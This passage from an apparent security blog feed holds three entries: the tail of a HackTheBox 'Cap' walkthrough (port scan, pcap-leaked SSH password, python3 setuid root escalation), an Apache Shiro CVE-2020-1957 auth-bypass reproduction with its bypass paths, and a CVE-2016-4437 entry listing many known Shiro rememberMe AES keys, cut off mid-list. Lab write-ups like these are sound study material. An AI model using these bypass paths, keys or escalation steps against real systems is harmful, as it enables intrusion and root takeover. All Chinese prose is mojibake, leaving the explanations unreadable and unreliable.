name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">|_http-title: Security Dashboard</span><br><span class="line">1117/tcp filtered ardus-mtrns</span><br><span class="line">3371/tcp filtered satvid-datalnk</span><br><span class="line">5822/tcp filtered unknown</span><br><span class="line">5952/tcp filtered unknown</span><br><span class="line">8652/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=7/14%Time=60EE6988%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,1059,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20</span><br><span class="line">SF:Wed,\x2014\x20Jul\x202021\x2004:39:13\x20GMT\r\nConnection:\x20close\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193</span><br><span class="line">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\</span><br><span class="line">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\</span><br><span class="line">SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=</span><br><span class="line">SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image</span><br><span class="line">SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="line">SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;</span><br><span class="line">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon</span><br><span class="line">SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span><br><span class="line">SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=</span><br><span class="line">SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.</span><br><span class="line">SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c</span><br><span class="line">SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption</span><br><span class="line">SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2</span><br><span class="line">SF:014\x20Jul\x202021\x2004:39:14\x20GMT\r\nConnection:\x20close\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP</span><br><span class="line">SF:TIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2</span><br><span class="line">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text</span><br><span class="line">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali</span><br><span class="line">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP</span><br><span class="line">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(GenericLines,11E,&quot;HTT</span><br><span class="line">SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type</span><br><span class="line">SF::\x20text/html\r\nContent-Length:\x20193\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x</span><br><span class="line">SF:20&lt;body&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20Invalid\x20Request\x20Line\x20&amp;#x27;Invalid\x20HTTP\x20request\x20li</span><br><span class="line">SF:ne:\x20&amp;#x27;&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 221.16 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-FTPåŒ¿åè®¿é—®"><a href="#0x02-FTPåŒ¿åè®¿é—®" class="headerlink" title="0x02.FTPåŒ¿åè®¿é—®"></a>0x02.FTPåŒ¿åè®¿é—®</h2><p><code>ç”±äºå¼€æ”¾äº†21ç«¯å£ï¼Œæ‰€ä»¥å°è¯•åŒ¿åç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸å…è®¸åŒ¿åç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">ftp: anonymous@10.10.10.245: Name or service not known</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°è¿™æ˜¯ä¸€ä¸ªç½‘ç»œè®¾å¤‡ç®¡ç†é¢æ¿</code></p><img src="/2021/07/14/HTB-cap/image-20210714131548126.png" class><p><code>å¤šæ¬¡ç‚¹å‡»å‘ç°urlä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¸”å¯ä»¥ä¸‹è½½æ•°æ®åŒ…</code></p><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><p><code>æ‰«ædataç›®å½•ï¼Œè®¿é—®å‘ç°ä¸€å…±æœ‰6ä¸ªæœ‰æ•ˆé“¾æ¥ï¼Œåˆ†åˆ«æ˜¯0ã€1ã€2ã€3ã€4ã€5ï¼Œå…¨éƒ¨ä¸‹è½½</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# dirb http://10.10.10.245/data/                                                                                                                         1 âš™</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Wed Jul 14 01:10:25 2021</span><br><span class="line">URL_BASE: http://10.10.10.245/data/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://10.10.10.245/data/ ----</span><br><span class="line">+ http://10.10.10.245/data/0 (CODE:200|SIZE:17147)</span><br><span class="line">+ http://10.10.10.245/data/00 (CODE:200|SIZE:17147) </span><br><span class="line">+ http://10.10.10.245/data/01 (CODE:200|SIZE:17144) </span><br><span class="line">+ http://10.10.10.245/data/02 (CODE:200|SIZE:17144)</span><br><span class="line">+ http://10.10.10.245/data/03 (CODE:200|SIZE:17144)                                                   </span><br><span class="line">+ http://10.10.10.245/data/04 (CODE:200|SIZE:17144)                                                     </span><br><span class="line">+ http://10.10.10.245/data/05 (CODE:200|SIZE:17147)                                                   </span><br><span class="line">+ http://10.10.10.245/data/1 (CODE:200|SIZE:17144)                                                      </span><br><span class="line">+ http://10.10.10.245/data/2 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/3 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/4 (CODE:200|SIZE:17144)                                                       + http://10.10.10.245/data/5 (CODE:200|SIZE:17147)</span><br></pre></td></tr></table></figure><img src="/2021/07/14/HTB-cap/image-20210714132457089.png" class><h2 id="0x04-æ•°æ®åŒ…åˆ†æ"><a href="#0x04-æ•°æ®åŒ…åˆ†æ" class="headerlink" title="0x04.æ•°æ®åŒ…åˆ†æ"></a>0x04.æ•°æ®åŒ…åˆ†æ</h2><p><code>6ä¸ªæ•°æ®åŒ…ä¸­åªæœ‰0.pcapåŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œå¾—åˆ°ç”¨æˆ·ä¸å¯†ç </code></p><blockquote><p>user:nathan</p><p>pass:Buck3tH4TF0RM3!</p></blockquote><img src="/2021/07/14/HTB-cap/image-20210714140327176.png" class><p><code>ç™»å…¥å¾—åˆ°flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh nathan@10.10.10.245                                                                                                                                1 âš™</span><br><span class="line">nathan@10.10.10.245&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed Jul 14 06:11:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.04</span><br><span class="line">  Usage of /:            35.0% of 8.73GB</span><br><span class="line">  Memory usage:          21%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             228</span><br><span class="line">  Users logged in:       0</span><br><span class="line">  IPv4 address for eth0: 10.10.10.245</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:dda9</span><br><span class="line"></span><br><span class="line">  =&gt; There are 4 zombie processes.</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">nathan@cap:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">nathan@cap:~$ cat user.txt </span><br><span class="line">*************************</span><br><span class="line">nathan@cap:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-ææƒ"><a href="#0x05-ææƒ" class="headerlink" title="0x05.ææƒ"></a>0x05.ææƒ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nathan@cap:~$ python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> /bin/bash</span></span><br><span class="line">root@cap:~# cd /root</span><br><span class="line">root@cap:/root# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@cap:/root# cat root.txt </span><br><span class="line">****************************</span><br><span class="line">root@cap:/root# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/07/14/HTB-cap/image-20210714122750156.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1957</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2020-1957/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2020-1957/</id>
    <published>2021-06-06T13:20:02.000Z</published>
    <updated>2021-06-06T13:39:25.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"><a href="#ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´" class="headerlink" title="ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"></a>ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´</h2><hr><h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache Shiro 1.5.2ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p><a id="more"></a><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt; v1.5.2</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">è½®å­è½®å­<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03.æ¼æ´å¤ç°"></a>0x03.æ¼æ´å¤ç°</h2><p><strong>ç¯å¢ƒæ­å»º</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p><p>adminè®¤è¯ç»•è¿‡</p><p>ç›´æ¥è®¿é—®/adminï¼Œè·³è½¬åˆ°ç™»å…¥é¡µé¢</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class><p>ç»•è¿‡ï¼š/demo/..;/admin/  æˆ–   /demo;/../admin/</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot;&gt;&lt;a href=&quot;#ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot;&gt;&lt;/a&gt;ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;p&gt;Apache Shiro 1.5.2ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437å¤ç°</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2016-4437/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2016-4437/</id>
    <published>2021-06-06T12:54:08.000Z</published>
    <updated>2021-06-06T13:11:13.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´"><a href="#ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´"></a>ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´</h2><hr><h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache shiroé»˜è®¤ä½¿ç”¨äº†<code>CookieRememberMeManager</code>ï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°<code>rememberMeçš„cookieå€¼</code>â€“&gt;<code>Base64è§£ç </code>â€“&gt;<code>AESè§£å¯†</code>â€“&gt;<code>ååºåˆ—åŒ–</code>ã€‚<br>ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚</p><a id="more"></a><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt;= v1.2.4</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">ä¸é€ è½®å­äº†ã€‚ã€‚ã€‚<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><p> ç½‘ç»œä¸Šæ”¶é›†åˆ°çš„key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span 